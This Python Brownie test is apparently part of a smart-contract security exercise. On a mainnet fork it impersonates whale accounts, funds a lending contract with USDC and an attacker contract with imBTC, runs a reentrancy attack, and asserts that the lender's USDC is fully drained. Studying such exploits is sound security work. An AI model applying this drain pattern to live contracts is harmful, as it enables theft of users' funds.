from brownie import accounts, ChainLend, Attack32, Contract, network
from brownie.convert import EthAddress
# Setting accounts
#network.connect("mainnet-fork")

def test_reentrancy_3():
    #Setting accounts
    if network.show_active() != "mainnet-fork":
        network.disconnect()
        network.connect("mainnet-fork")

    [dep, user, attacker]  = accounts[:3]

    USDC = EthAddress("0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48")
    USDC_WHALE = EthAddress("0xF977814e90dA44bFA03b6295A0616a897441aceC")
    imBTC = EthAddress("0x3212b29E33587A00FB1C83346f5dBFA69A458923")
    imBTC_WHALE = EthAddress("0xFEa4224Da399F672eB21a9F3F7324cEF1d7a965C")

    re3 = ChainLend.deploy(imBTC, USDC, {'from': dep})

    # First time getting contracts from explorer (IF its first time running, uncomment both below lines)
    #imbtc = Contract.from_explorer(USDC)
    #usdc = Contract.from_explorer(re3.borrowToken())

    # Below syntax can be used after retrieving target contract from explorer a first time(If is the first time, try above commented lines instead).
    imbtc = Contract(re3.depositToken())
    usdc = Contract(re3.borrowToken())

    # Impersonating WHALE accounts
    usdc_acct = accounts.at(USDC_WHALE, force=True)
    imBTC_acct = accounts.at(imBTC_WHALE, force=True)

    # Deploying 1st variant of Attacker contract (This is for the full Token drain)
    att = Attack32.deploy(re3.address, {'from': attacker})
    # Deploying 2nd variant of Attacker contract (comment above line and uncomment below line)
    #att = Attack3.deploy(re3.address, {'from': attacker})

    # Setting variable for later assertion
    USDC_BALANCE = 1e6 * 1000000
    imBTC_BALANCE = 1e8

    # Funding Target Contract with USDC WHALE
    usdc.transfer(re3.address, USDC_BALANCE, {'from':usdc_acct}).wait(1)
    #Asserting target contract new USDC funds
    assert(usdc.balanceOf(re3) ==USDC_BALANCE)

    # Funding Attacker contract with imBTC WHALE 
    imbtc.transfer(att.address, imBTC_BALANCE,{'from':imBTC_acct}).wait(1)
    #Asserting attacker contract new imBTC balance
    assert(imbtc.balanceOf(att) ==imBTC_BALANCE)

    # asserting initial Attacker n'contract re3.deposits balance
    assert(re3.deposits(attacker) == 0)
    assert(re3.deposits(att) == 0)

     #Attacking
    att.attack()

    # POST ATTACK TEST
    #re3.deposits(att)
    #assert(imbtc.balanceOf(att) == 99999930) # This test is for the intended solution
    assert(imbtc.balanceOf(att) ==imBTC_BALANCE) # This test is only good for the 2nd attack contract.
    assert(usdc.balanceOf(re3) == 0)
    assert(usdc.balanceOf(att) ==USDC_BALANCE)


